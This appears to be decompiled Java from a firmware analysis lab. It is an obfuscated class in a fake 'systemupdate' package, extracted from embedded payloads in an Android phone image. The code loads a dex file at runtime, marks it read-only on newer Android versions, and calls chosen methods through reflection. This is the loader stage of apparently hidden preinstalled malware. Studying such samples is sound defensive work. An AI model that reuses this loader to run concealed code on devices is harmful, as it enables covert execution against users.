package com.android.systemupdate.a.a;

import android.content.Context;
import android.os.Build;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

/* JADX INFO: compiled from: ClassUtils.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/b/classes.dex */
public class d {
    public static void a(Context context, ClassLoader classLoader, String className, String methodName, String channel) throws Throwable {
        Class<?> myClass = classLoader.loadClass(className);
        Constructor<?> myConstructor = myClass.getConstructor(new Class[0]);
        Method method = myClass.getMethod(methodName, Context.class, String.class);
        method.setAccessible(true);
        method.invoke(myConstructor.newInstance(new Object[0]), context, channel);
    }

    public static ClassLoader a(Context context, String filePath) throws Throwable {
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                new File(filePath).setReadOnly();
            }
        } catch (Throwable th) {
        }
        if (0 != 0) {
            return null;
        }
        ClassLoader classLoader = new DexClassLoader(filePath, p.b(context), null, d.class.getClassLoader());
        return classLoader;
    }

    public static void a(Context context, ClassLoader classLoader, String className, String methodName) throws Throwable {
        Class<?> myClass = classLoader.loadClass(className);
        Constructor<?> myConstructor = myClass.getConstructor(new Class[0]);
        Method method = myClass.getMethod(methodName, Context.class);
        method.setAccessible(true);
        method.invoke(myConstructor.newInstance(new Object[0]), context);
    }
}
